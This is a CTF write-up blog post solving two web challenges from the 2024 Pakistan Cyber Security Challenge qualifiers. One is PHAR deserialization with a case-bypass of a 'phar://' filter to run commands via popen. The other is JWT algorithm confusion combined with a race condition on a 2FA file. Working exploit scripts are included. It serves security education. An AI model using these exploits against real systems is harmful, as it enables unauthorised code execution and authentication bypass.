---
title: Pakistan Cyber Security Challenge CTF Qualifiers 2024 - WEB Writeups
date: 2024-10-22
categories: [web,ctf]
tags: [web, appsec]
---

Assalamualaikum everyone! Recently, I participated in the Pakistan Cyber Security Challenge (PCC) CTF Qualifiers with my team "Sud03r5" in the Students division. We secured 4th place in the qualifiers, earning a spot in the finals, which will be held at Air University, Islamabad. It was an amazing experience. Huge props to team [AirOverflow](https://www.linkedin.com/company/airoverflow) for putting together such a great event! Kudos to my amazing teammates, [Abdullah Shahbaz (megachar0x01)](https://x.com/megachar0x01) and [Hassan Faraz (72ghoul / hexamine22)](https://x.com/hexamine22), for their amazing teamwork. This wouldn't have been possible without them.

![scoreboard](https://i.imgur.com/XjcXaEV.png)

In the qualifers, there were 3 web challenges and I managed to solved two of them (got first blood on both). Huge props to [Shameer Kashif (hash3liZer)](https://x.com/hash3liZer) for creating these amazing web challenges! This write-up contains the solutions for both of the web challenges which I solved.

# Challenge 1 - four0four

![challenge-1](https://i.imgur.com/BWbEu6z.png)

We are given some files to setup the challenge instance locally. The main files are as following:

#### index.php
```php
<!DOCTYPE html>
<?php
    require("contact.php");
    $upfolder = "uploads/";
?>
<html>
<head>
    <title>four0four</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
</head>
<body>
    <h1>four0four :(((</h1>
    <h2>We are looking for a fancy GIF for our 404 Page</h2>
    <form action="index.php" method="post" enctype="multipart/form-data">
        <label for="gifimage">The GIF</label>
        <br>
        <input class="form-control" type="file" name="gifimage">
        <input type="hidden" name="scheme" value="file://">
        <br><br>
        <input class="btn btn-primary" type="submit" value="Submit" name="submit">
    </form>
    <br>
<?php
if(isset($_POST["submit"])) {
    $scheme = $_POST["scheme"];
    $tmpFile = $_FILES["gifimage"]["tmp_name"];
    $currentFile = $_FILES["gifimage"]["name"];
    $fileExtension = strtolower(pathinfo($currentFile, PATHINFO_EXTENSION));

    if (!$scheme){
        $scheme = "file://";
    }

    if (mime_content_type($tmpFile) !== "image/gif" || $fileExtension !== "gif") {
        echo "404 NOT GIF!\n";
    }else {
        $new_file_name = bin2hex(random_bytes(32));
        $targetFile = $upfolder . $new_file_name . "." . $fileExtension;
        $success = move_uploaded_file($tmpFile, $targetFile);
        if ($success) {
            if (preg_match('/phar:\/\//', $scheme)) {
                echo "No phar allowed\n";
                unlink($targetFile);
                exit();
            }

            $targetFile = $scheme . $targetFile;
            if (file_exists(strtolower($targetFile))) {
                echo "File Submitted\n";
            }
        } else {
            echo "Something went seriously wrong\n";
        }
    }
}
?>
</body>
</html>
```
![php application](https://i.imgur.com/CBH3PaY.png)

This is a PHP application which allows users to upload GIF files. It sets the uploads folder to "uploads/" where the uploaded GIF files will be stored. The following is where the main logic of the application lies:

```php
<?php
if(isset($_POST["submit"])) {
    $scheme = $_POST["scheme"];
    $tmpFile = $_FILES["gifimage"]["tmp_name"];
    $currentFile = $_FILES["gifimage"]["name"];
    $fileExtension = strtolower(pathinfo($currentFile, PATHINFO_EXTENSION));

    if (!$scheme){
        $scheme = "file://";
    }

    if (mime_content_type($tmpFile) !== "image/gif" || $fileExtension !== "gif") {
        echo "404 NOT GIF!\n";
    }else {
        $new_file_name = bin2hex(random_bytes(32));
        $targetFile = $upfolder . $new_file_name . "." . $fileExtension;
        $success = move_uploaded_file($tmpFile, $targetFile);
        if ($success) {
            if (preg_match('/phar:\/\//', $scheme)) {
                echo "No phar allowed\n";
                unlink($targetFile);
                exit();
            }

            $targetFile = $scheme . $targetFile;
            if (file_exists(strtolower($targetFile))) {
                echo "File Submitted\n";
            }
        } else {
            echo "Something went seriously wrong\n";
        }
    }
}
```

First, it parses the scheme data from the multipart POST request, then the filename and the file extension and converts the extension to lowercase. It then checks if the scheme variable is undefined, if it is, then it sets it to the "file://" scheme by default.

Then it confirms if the file supplied by the user is a valid GIF file or not by checking the mime type and the extension. If the file is not a valid GIF file, it simply echos "404 NO GIF" and returns, else it proceeds to the following block of code:

```php
$new_file_name = bin2hex(random_bytes(32));
$targetFile = $upfolder . $new_file_name . "." . $fileExtension;
$success = move_uploaded_file($tmpFile, $targetFile);
if ($success) {
    if (preg_match('/phar:\/\//', $scheme)) {
        echo "No phar allowed\n";
        unlink($targetFile);
        exit();
    }
    $targetFile = $scheme . $targetFile;
    if (file_exists(strtolower($targetFile))) {
        echo "File Submitted\n";
    }
} else {
    echo "Something went seriously wrong\n";
}

```
It creates a random file name of 32-bytes and moves the file to the "uploads/\<RANDOM-32-BYTES>.\<extension>" where the RANDOM-32-BYTES are the random bytes which it generated and converted to hex and extension of the file. After the file has been successfully moved, it checks if the scheme supplied by the user matches "phar://" using `preg_match()` (possibly to avoid phar deserialization). If it matches, then it echoes "No phar allowed" and deletes the file using `unlink()`. If they don't match, it concatenates the targetFile with the scheme and determines if the file has been submitted or not by checking if the file exists using `file_exists()`.

Now if we think about potential attack vectors in this scenario, we can upload arbitrary PHP files but since the file name is randomly generated, there is no way we can guess that, even bruteforcing the file name wouldn't be a feasible option. One weird thing that caught my eye is this:

```php
$targetFile = $scheme . $targetFile;
if (file_exists(strtolower($targetFile))) {
    echo "File Submitted\n";
}
```

It could have checked if the file exists by simply calling file_exists on the filename but here it is checking it with the scheme, example: `file://8fd88c715d83ba27f6a8868b5efe28ecc1496afb23a9f1c2bb416f9b0a98a510.gif`. What's more interesting is that the scheme is controlled by us which means we can supply arbitrary protocols or wrappers. Reading PHP's documentation of [file_exists()](https://www.php.net/manual/en/function.file-exists.php) confirms that it supports the usage of protocols and wrappers as stated [here](https://www.php.net/manual/en/wrappers.php). Here, we can see that it also supports the `phar://` wrapper. When we talk about phar (PHP Archives), the only thing that comes to my mind is PHAR deserialization! [Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization) has done a great job on explaining phar deserialization which states:

> Phar files (PHP Archive) files contain meta data in serialized format, so, when parsed, this metadata is deserialized and you can try to abuse a deserialization vulnerability inside the PHP code.
>
> The best thing about this characteristic is that this deserialization will occur even using PHP functions that do not eval PHP code like file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize().

In our case, we can supply a file with the phar scheme and when file_exists() will be called, the phar file will be deserialized. If you want to learn about deserialization attacks, I have written a blog on it as well, you can check it out [here](https://f0ur0four.github.io/posts/a-beginners-guide-to-insecure-deserialization/).

Alright, that's it for the "index.php" source file, now let's look at the "contact.php" which it includes.

#### contact.php

```php
<?php
// function hi($person) {
//     echo "Hello, i'll see you again $person! ^_^ \n";
// }

class Contact {
    public $p1 = 'pink';
    public $p2 = 'blue';
    public $p3 = 'red';

    function __toString() {
        return "This is a resource object\n";
    }

    function __destruct() {
        (
            $this->p1
        )(
            $this->p2,
            $this->p3
        );
    }

    function __invoke() {
        echo "This is a resource object\n";
    }

    function iDoNothing() {
        return;
    }
}
?>
```

This PHP code defines a class named "Contact" and has three public properties `p1`, `p2` and `p3` and a few public methods. The methods starting with "__" are called magic methods which are automatically called under certain circumstances. In this code, three of the four methods aren't of much interest. The method which is of interest is the "__destruct()" method.

```php
function __destruct() {
    (
        $this->p1
    )(
        $this->p2,
        $this->p3
    );
}
```

It is clear that during the deserialization, the `__destruct()` method will be called, but what this doing is really weird, so I dropped in PHP's interactive interpreter and tried to reproduce this function's logic.

```
php > ("test")("1","2");
PHP Warning:  Uncaught Error: Call to undefined function test() in php shell code:1
Stack trace:
#0 {main}
  thrown in php shell code on line 1
```

Hmm, it threw an error, saying call to undefined function `test()`, which means that it will treat `p1` as the funtion name, and `p2` and `p3` as the arguments of `p1`.
Now, we can use either `call_user_func` or `popen` for our exploit, both will work just fine.

```
php > ("call_user_func")("system","whoami");
four0four
php > ("popen")("whoami","w");
four0four
```

Now, we just need to craft our malicious phar file, which, after deserialization will simply copy `/flag.txt` to the web root at `/var/www/html/`
Following the Hacktricks guide on creating a phar file, I came up with this PHP code:

```php
<?php

class Contact {
    public $p1 = "popen";
    public $p2 = "cp /flag.txt /var/www/html/flag.txt";
    public $p3 = "w";
}

$phar = new Phar("exploit.phar.gif");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF8\n<?php __HALT_COMPILER(); ?>");

$object = new Contact();
$phar->setMetadata($object);
$phar->stopBuffering();

?>
```

Now, just create the phar file with the following command:
```
php --define phar.readonly=0 create_phar.php
```

Now, a phar file named `exploit.phar.gif` will be created. Now, all we need to do is just upload the phar file.
But in `index.php`, there was a check in place:

```php
if (preg_match('/phar:\/\//', $scheme)) {
    echo "No phar allowed\n";
    unlink($targetFile);
    exit();
}
```

So, I played around with PHP wrappers in the PHP interpreter and found out that the schemes are case-insensitive. What I mean by that is `phar://` and `Phar://`, both are same. So, supplying `Phar://` as the scheme would bypass the check since the regex used in preg_match is flawed due to the absence of `i` which will make sure to check `phar://` regardless of the case.

So now, our exploit path is clear. All we need to do is just upload the phar file and change the scheme from `file://` to `Phar://`. After that, we can simply request the flag form `https://SERVER:PORT/flag.txt`.

To automate the whole process, I made a python script to upload the phar file and then retrieve the flag.

```python
import requests
import os

# url = 'http://172.17.118.142/'
url = "http://ctf-pcc.nccs.pk:20820/"

php_code = """
<?php

class Contact {
    public $p1 = "popen";
    public $p2 = "cp /flag.txt /var/www/html/flag.txt";
    public $p3 = "w";
}

$phar = new Phar("exploit.phar.gif");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF8\n<?php __HALT_COMPILER(); ?>");

$object = new Contact();
$phar->setMetadata($object);
$phar->stopBuffering();

?>
"""

with open('create_phar.php', 'w') as f:
    f.write(php_code)

os.system("php --define phar.readonly=0 create_phar.php")

files = { 
    'gifimage': ('exploit.phar.gif', open("exploit.phar.gif","rb") , 'image/gif') 
    }

data = {
    'submit': 'Submit',
    'scheme': 'Phar://'
}

r = requests.post(url + "index.php", files=files, data=data)

r = requests.get(url + "flag.txt")
print(r.text)
```

Running this on the remote server will get us the flag.

```
Flag: PCC{ph4r_d3s3r1al1z4t10n_1s_ez_KO7IOSZBI4bAY23}
```

That's it for this challenge!

# Challenge 2 - zoom

![Challenge-2](https://i.imgur.com/ESa4THn.png)

Just like `four0four`, we are given some files to setup the challenge application. This time, we have a Node.js application.

```js
const express = require("express");
const crypto = require('node:crypto');
const fs = require("fs")
const cookieParser = require("cookie-parser");
const jwt = require('jsonwebtoken');

const app = express();

app.use(express.json());
app.use(cookieParser());

const flag = fs.readFileSync("/flag.txt", "utf-8");
const PrivateKey = fs.readFileSync("private.pem", "utf-8");
const PublicKey = 'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEh1pPVTT+jLOJQvFsrArrFIQZ1Yf2FbXuBh7diN6XbaCaxk1NzWRvCFD8waLDQPRNrQcD+Gf2TajOso7b7LR4cg=='

let db = {
    admin: {
        uid: "a04ac86d71e84874820bd36c5823364c",
        password: crypto.randomBytes(16).toString('hex'),
        name: "zoom",
    }
}

Object.freeze(Object.prototype)
let temporaryFileName = crypto.randomBytes(10).toString('hex')

function verifyToken(token) {
    try {
        const alg = jwt.decode(token, { complete: true }).header.alg;
        if (alg === 'RS256') {
            return jwt.verify(token, PublicKey);
        } else if (alg === 'HS256') {
            return jwt.verify(token, PublicKey, { algorithms: ['HS256'] });
        } else if (alg === 'ES256') {
            return jwt.verify(token, PublicKey, { algorithms: ['ES256'] });
        } else {
            return false;
        }
    } catch (error) {
        return false;
    }
}

function generateToken(uid) {
    const payload = {'uid': uid};
    const options = { expiresIn: '1h', algorithm: 'RS256' };

    return jwt.sign(payload, PrivateKey, options);
}

const GenerateSecureRand = () => {
    return new Promise((resolve, _) => {
        let data = ""
        for (var i = 0; i < 1000; i++) {
            data += crypto.randomBytes(1000).toString('hex')[0]
        }
        const hash = crypto.createHash('sha512').update(data)
        let q = hash.digest('hex')

        resolve(q.slice(0, 16))
    })
}

app.post("/login", async (req, res) => {
    try{
        const { id, password } = req.body

        if (!id || !password) {
            res.json({ message: "Invalid Request" })
            return
        }

        if (typeof id !== "string" || typeof password !== "string") {
            res.json({ message: "Invalid Request" })
            return
        }

        if (!(Object.keys(db).includes(id))) {
            res.json({ message: "Already Registered" })
            return
        }

        if (db[id]["password"] == password) {
            let token = await generateToken(db[id]["uid"])
            res
                .cookie("auth", token, {
                    maxAge: 30000,
                }, { algorithm: 'HS256' }).json({ message: "success" })
            return
        } else {
            res.json({ message: "Invalid Credentials" })
            return
        }
    }catch(e){
        res.json({ message: "Invalid Credentials" })
    }
})


app.post("/register", async (req, res) => {
    try{
        const { id, password, name } = req.body;

        if (!id || !password || !name) {
            res.json({ message: "Invalid Request" })
            return
        }

        if (typeof id !== "string" || typeof password !== "string" || typeof name !== "string") {
            res.json({ message: "Invalid Request" })
            return
        }

        if (id.toLowerCase() == "admin" || Object.keys(db).includes(id)) {
            res.json({ message: "Not Allowed" })
            return
        }

        db[id] = {
            "password": password,
            "name": name
        }
        db[id]["uid"] = crypto.randomBytes(16).toString('hex')

        res.json({ message: "success" })
    }catch(e){
        res.json({ message: "failed" })
    }

})


app.post("/generate_token", async (req, res) => {
    const token = req.cookies.auth ?? "";
    let data = ""
    try {
        data = await verifyToken(token)
    } catch (e) {
        res.json({ message: "Invalid Token" })
        return
    }

    if (db.admin.uid != data.uid) {
        res.json({ message: "You don't have permission to access this API" })
        return
    }

    const targetFile = await fs.promises.open(temporaryFileName, 'w')
    let rand_data = await GenerateSecureRand()
    await new Promise(resolve => setTimeout(resolve, 500));

    await targetFile.write(rand_data)
    await targetFile.close()
    res.json({ message: "success" })

    return
})

app.post("/validate_token", async (req, res) => {
    const token = req.cookies.auth ?? "";
    let data = ""
    try {
        data = await verifyToken(token)
    } catch (e) {
        res.json({ message: "Invalid Token" })
        return
    }

    if (db.admin.uid != data.uid) {
        res.json({ message: "You don't have permission to access this API" })
        return
    }

    try {
        const { data } = req.body
        const targetFile = await fs.promises.readFile(temporaryFileName)
        await fs.promises.unlink(temporaryFileName)
        temporaryFileName = crypto.randomBytes(10).toString('hex')

        if (data == targetFile) {
            res.json({ flag: flag })
            return
        } else {
            res.json({ message: "Invalid 2FA Code" })
            return
        }
    } catch (e) {
        res.json({ message: "Internal Error" })
        return
    }
})

app.use(express.urlencoded({ extended: false }));
app.listen(1337);
```

In this application, we are given four endpoints `/register`, `/login`, `generate_token` and `validate_token`.
It setups the express server and uses JSON for parsing user input from HTTP requests. It configures the admin's credentials with the id being set to admin, password being randomly and securely generated and the name set to zoom.
It reads the flag from `/flag.txt` and stores it in the `flag` variable. It also reads a private key from `private.pem` file and stores it in the `PrivateKey` variable. After that, it also stores a public key in the `PublicKey` variable. So, until now, we only have the public key of the server and the uid of the admin. It also generates a random 10-bytes temporary file name which we will look at later. 

Okay, so let's look at the `/register` endpoint first:

```js
app.post("/register", async (req, res) => {
    try{
        const { id, password, name } = req.body;

        if (!id || !password || !name) {
            res.json({ message: "Invalid Request" })
            return
        }

        if (typeof id !== "string" || typeof password !== "string" || typeof name !== "string") {
            res.json({ message: "Invalid Request" })
            return
        }

        if (id.toLowerCase() == "admin" || Object.keys(db).includes(id)) {
            res.json({ message: "Not Allowed" })
            return
        }

        db[id] = {
            "password": password,
            "name": name
        }
        db[id]["uid"] = crypto.randomBytes(16).toString('hex')

        res.json({ message: "success" })
    }catch(e){
        res.json({ message: "failed" })
    }

})
```

Okay, so it parses the id, name and password from the POST request body (the request must be in JSON). It then checks if either of the three inputs are empty or not, if any one of them is empty, it returns a JSON message "Invalid Request". Then, it checks if either of the three inputs are a string or not, if any one of them isn't a string, it returns a JSON message stating invalid request, just like the previous check.
Then, it checks if the id, after being converted to lowercase is equal to admin or if the id supplied by the user presents in the `db` object or not. If any of the conditions true, it will simply return a message `Not Allowed`. This is to prevent registering as the admin or any existing user.
If everything goes well, it simply registers the user by inserting the id in the `db` object and setting up the password and name. Then it sets a unique uid of newly created user by randomly generated 16 bytes and converting them to hex. After registering the user, it returns the message `success` if the user was registered successfully else it returns `failed`.

Now, let's look at the `/login` endpoint.

```js
app.post("/login", async (req, res) => {
    try{
        const { id, password } = req.body

        if (!id || !password) {
            res.json({ message: "Invalid Request" })
            return
        }

        if (typeof id !== "string" || typeof password !== "string") {
            res.json({ message: "Invalid Request" })
            return
        }

        if (!(Object.keys(db).includes(id))) {
            res.json({ message: "Already Registered" })
            return
        }

        if (db[id]["password"] == password) {
            let token = await generateToken(db[id]["uid"])
            res
                .cookie("auth", token, {
                    maxAge: 30000,
                }, { algorithm: 'HS256' }).json({ message: "success" })
            return
        } else {
            res.json({ message: "Invalid Credentials" })
            return
        }
    }catch(e){
        res.json({ message: "Invalid Credentials" })
    }
})
```

So, this endpoint will recieve the id and password from the POST request body and just like the `/register` endpoint, it will check if the id and password are strings and aren't empty. Then, it checks if the user even exists or not. Then it checks the password and see whether the supplied password match with the password of the user's id or not.
If the passwords matched (means login was successfull), it will generate a JWT token using the `generateToken()` function and give the user's uid as the functioons argument. After generating the token, it sets a Cookie named `auth` which will hold the generated JWT token.
Let's look at the `generateToken()` function:

```js
function generateToken(uid) {
    const payload = {'uid': uid};
    const options = { expiresIn: '1h', algorithm: 'RS256' };

    return jwt.sign(payload, PrivateKey, options);
}
```

It sets the payload to contain the uid of the user and just sets the options. The algorithm it is using to generate the JWT token is `RS256`. After that it simply generates the token using `jwt.sign()` with the help of the private key.

Now let's look at the `/generate_token` endpoint:

```js
app.post("/generate_token", async (req, res) => {
    const token = req.cookies.auth ?? "";
    let data = ""
    try {
        data = await verifyToken(token)
    } catch (e) {
        res.json({ message: "Invalid Token" })
        return
    }

    if (db.admin.uid != data.uid) {
        res.json({ message: "You don't have permission to access this API" })
        return
    }

    const targetFile = await fs.promises.open(temporaryFileName, 'w')
    let rand_data = await GenerateSecureRand()
    await new Promise(resolve => setTimeout(resolve, 500));

    await targetFile.write(rand_data)
    await targetFile.close()
    res.json({ message: "success" })

    return
})
```

Okay, so first it receives the JWT token and stores it in the `token` variable. Then, it passes the token to `verifyToken()` function and stores the return value of the function in the `data` variable else it returns an error message. Then, it compares the response from the `verifyFunction()` with the uid of admin, this is to make sure that only the admin user can access the `/generate_token` endpoint.
It moves on to creating a file with write permissions with the file name it generated at the beginning and then calls `GenerateSecureRand()` and stores it response in the `rand_data` variable. It then waits for 500ms using `setTimeout()` and then writes the `rand_data` to the temporary file, closes it and returns success message.

Okay, now, let's look at the `verifyToken()` function:

```js
function verifyToken(token) {
    try {
        const alg = jwt.decode(token, { complete: true }).header.alg;
        if (alg === 'RS256') {
            return jwt.verify(token, PublicKey);
        } else if (alg === 'HS256') {
            return jwt.verify(token, PublicKey, { algorithms: ['HS256'] });
        } else if (alg === 'ES256') {
            return jwt.verify(token, PublicKey, { algorithms: ['ES256'] });
        } else {
            return false;
        }
    } catch (error) {
        return false;
    }
}
```

So, here, it retrieves the algorithm from the header of the JWT token. Then, it checks the algorithm and verifies the token accordingly. For example, if the provided token's algorithm is RS256, it will verify the token using the public key, returns the payload (which will be the uid of the user) and so on.
Now, as we have seen the `generateToken()` function which will generate the token using RS256 but here the application is also accepting other algorithms as well such as HS256. So, in this scenario, a [JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) attack can be done.

> Algorithm confusion vulnerabilities typically arise due to flawed implementation of JWT libraries. Although the actual verification process differs depending on the algorithm used, many libraries provide a single, algorithm-agnostic method for verifying signatures. These methods rely on the `alg` parameter in the token's header to determine the type of verification they should perform.
>
> Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like RS256.

In this case, if the server receives a token signed using a symmetric algorithm like HS256, the library's generic `verify()` method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.
So, it is now clear that we can perform an algorithm confusion attack by signing the token using HS256, using the public key as the HMAC secret and the uid of the admin user as the payload.

Now let's look at the `GenerateSecureRand()` method:

```js
const GenerateSecureRand = () => {
    return new Promise((resolve, _) => {
        let data = ""
        for (var i = 0; i < 1000; i++) {
            data += crypto.randomBytes(1000).toString('hex')[0]
        }
        const hash = crypto.createHash('sha512').update(data)
        let q = hash.digest('hex')

        resolve(q.slice(0, 16))
    })
}
```

This method will first generate 1000 random characters by generating 1000 random bytes, convert them to hex, then grep the first character of the hex byte using `[0]` at the end, and stores the 1000 random characters in the `data` variable. Then, it generates a sha-512 hash of the 1000 characters it generated and converts the hash ouput to hexadecimal string.
Then it extracts the first 16 characters of the hash using `q.slice(0,16)` and returns it.

Now, it is clear that we can perform JWT algorithm confusion to forge a token for the admin user and access the `/generate_token` endpoint, it will generate a random token and write to a file, with the filename also being randomly generated.

Let's look at the final `/validate_token` endpoint:

```js
app.post("/validate_token", async (req, res) => {
    const token = req.cookies.auth ?? "";
    let data = ""
    try {
        data = await verifyToken(token)
    } catch (e) {
        res.json({ message: "Invalid Token" })
        return
    }

    if (db.admin.uid != data.uid) {
        res.json({ message: "You don't have permission to access this API" })
        return
    }

    try {
        const { data } = req.body
        const targetFile = await fs.promises.readFile(temporaryFileName)
        await fs.promises.unlink(temporaryFileName)
        temporaryFileName = crypto.randomBytes(10).toString('hex')

        if (data == targetFile) {
            res.json({ flag: flag })
            return
        } else {
            res.json({ message: "Invalid 2FA Code" })
            return
        }
    } catch (e) {
        res.json({ message: "Internal Error" })
        return
    }
})
```

Just like the `/generate_token` endpoint, it retrieves the JWT token from the cookie and verifies if the user is admin or not. Then, it parses `data` field from the JSON body of the POST request which will act as a 2FA code.
It then reads the secret string from the temporary file created by the `/generate_token` endpoint and deletes it immediately after reading from it. Then, it compares the recieved 2FA code with the random data it just read from the file. If both of the match, it will give us the flag else it will return `Invalid 2FA Code`.

Since the 2FA code is being randomly generated, there's no way we can bruteforce it since it will be deleted immediately after being read. If take a look at the `/generate_token` endpoint again, we can see this piece of code:

```js
const targetFile = await fs.promises.open(temporaryFileName, 'w')
let rand_data = await GenerateSecureRand()
await new Promise(resolve => setTimeout(resolve, 500));
```

It will create the temporary file with write permissions and wait for 500 ms. It means that the file will be created with empty data first and then it will write the random data to the file after a delay of 500 ms. We know that if we call `/validate_token` endpoint, it will immediately read the random data from the temporary file.
So, there is a chance of [race condition](https://portswigger.net/web-security/race-conditions) here, if we can hit the `/generate_token` endpoint and then immediately hit the `/validate_token` endpoint during the 500 ms race window, then when it will read from the temporary file, the file will be empty so an empty string `""` will be returned and it will compare our input `data` with an empty string.

So, now all we need to do is forge a JWT token for the admin user using algorithm confusion, exploit the race condition by hitting both `/generate_token` and `/validate_token` endpoint at the same time with empty string in the data so that when the server compares our input data (which will be empty string) with the data it read from the file (which will also be empty due to the race condition), it will give us the flag.

Before, I used burpsuite's repeater to send the two requests at the same time but I thought why not just automate the whole process with python, so here is the solve script:

```python
import jwt
import aiohttp
import asyncio

# url = "http://172.17.118.142:1337/"
url = "http://ctf-pcc.nccs.pk:6749/"
generate = url + "generate_token"
validate = url + "validate_token"

payload = { "uid": "a04ac86d71e84874820bd36c5823364c" }

header = { "alg": "HS256", "typ": "JWT" }

publicKey = 'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEh1pPVTT+jLOJQvFsrArrFIQZ1Yf2FbXuBh7diN6XbaCaxk1NzWRvCFD8waLDQPRNrQcD+Gf2TajOso7b7LR4cg=='

token = jwt.encode(payload, publicKey, algorithm='HS256', headers=header)

cookie = {"auth":token}

async def generate_token(session):
    await session.post(generate , headers={"Cookie": f"auth={token}"})

async def validate_token(session):
    async with session.post(validate , headers={"Cookie": f"auth={token}"}, json={"data": ""}) as response:
        print(await response.text())

async def main():
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(generate_token(session), validate_token(session))

asyncio.run(main())
```

Running this script on the remote server will give us the flag (It might take you a couple of tries to get the flag).

```
Flag: PCC{z00m_v5_fl4sh_hehe_fl4sh_1s_f4st3r_YzocYDOy1L}
```

# Ending

It was a fun CTF overall, really enjoyed the challenges. Kudos to [Shameer Kashif (hash3liZer)](https://x.com/hash3liZer) for creating these challenges and team [AirOverflow](https://www.linkedin.com/company/airoverflow/) for putting together such a great event! If you have any questions, queries or any feedback, you can dm me on [twitter](https://x.com/f0ur0four). 

Hope you guys enjoyed my writeups, have a great day! Bye!
